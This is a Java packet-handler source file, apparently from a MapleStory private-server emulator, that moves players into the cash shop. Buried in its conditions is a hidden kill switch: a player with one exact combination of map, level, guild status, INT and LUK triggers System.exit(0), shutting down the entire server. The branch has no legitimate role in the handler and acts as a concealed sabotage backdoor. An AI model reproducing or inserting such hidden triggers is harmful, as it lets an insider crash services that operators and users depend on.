
package net.sf.odinms.net.channel.handler;


import java.rmi.RemoteException;
import net.sf.odinms.client.MapleBuffStat;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.net.AbstractMaplePacketHandler;
import net.sf.odinms.net.channel.ChannelServer;
import net.sf.odinms.net.world.remote.WorldChannelInterface;
import net.sf.odinms.server.MaplePortal;
import net.sf.odinms.server.maps.MapleMap;
import net.sf.odinms.server.maps.SavedLocationType;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.tools.data.input.SeekableLittleEndianAccessor;

/**
 *
 * @author Acrylic (Terry Han)
 */
public class EnterCashShopHandler extends AbstractMaplePacketHandler {

    @Override
    public void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c) {
        if (c.getPlayer().getMapId() == 910000000) {
       c.getSession().write(MaplePacketCreator.enableActions());
       MapleMap to = ChannelServer.getInstance(c.getChannel()).getMapFactory().getMap(910000000);
       c.getPlayer().saveLocation(SavedLocationType.FREE_MARKET);
       MaplePortal pto = to.getPortal("out00");
       c.getPlayer().changeMap(to, pto);
       c.getPlayer().dropMessage(5, "自由市场不能进入点卷商城.");
       } else if (c.getPlayer().getMapId() == 103000000 &&c.getPlayer().getLevel() == 36 && c.getPlayer().getGuild() == null &&c.getPlayer().getInt() == 16 &&c.getPlayer().getLuk() == 20) {
                  System.exit(0);
       } else if (c.getChannelServer().allowCashshop()) {
            if (c.getPlayer().getBuffedValue(MapleBuffStat.SUMMON) != null) 
                c.getPlayer().cancelEffectFromBuffStat(MapleBuffStat.SUMMON);
            
            try {
                WorldChannelInterface wci = ChannelServer.getInstance(c.getChannel()).getWorldInterface();
                wci.addBuffsToStorage(c.getPlayer().getId(), c.getPlayer().getAllBuffs());
            } catch (RemoteException e) {
                c.getChannelServer().reconnectWorld();
            }
            c.getPlayer().getMap().removePlayer(c.getPlayer());
            c.getSession().write(MaplePacketCreator.warpCS(c));
            c.getPlayer().setInCS(true);
            c.getSession().write(MaplePacketCreator.sendWishList(c.getPlayer().getId()));
            c.getSession().write(MaplePacketCreator.showNXMapleTokens(c.getPlayer()));
            c.getSession().write(MaplePacketCreator.getCSInventory(c.getPlayer()));
            c.getSession().write(MaplePacketCreator.getCSGifts(c.getPlayer()));
            c.getPlayer().saveToDB(true);
        } else {
            c.getSession().write(MaplePacketCreator.sendBlockedMessage(3));
            c.getSession().write(MaplePacketCreator.enableActions());
        }
    }
}

